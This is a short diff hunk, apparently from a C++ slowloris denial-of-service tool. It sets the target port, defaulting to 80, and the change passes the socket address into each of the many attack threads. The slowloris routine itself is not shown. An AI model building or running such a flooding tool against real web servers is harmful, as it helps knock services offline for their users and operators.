@@ -75,7 +75,7 @@ int main(int argc, char* argv[]) {
     if (input.arg_exists("-p")) socket_address.sin_port = htons(strtoul(input.get_arg("-p").c_str(), NULL, 0));
     else socket_address.sin_port = htons(strtoul("80", NULL, 0));
     std::vector<std::thread> thread_vector;
-    for (int i = 0; i < threads; i++) thread_vector.push_back(std::thread(slowloris));
+    for (int i = 0; i < threads; i++) thread_vector.push_back(std::thread(slowloris, &socket_address));
     for (std::thread& thread : thread_vector) if (thread.joinable()) thread.join();
   }
 }
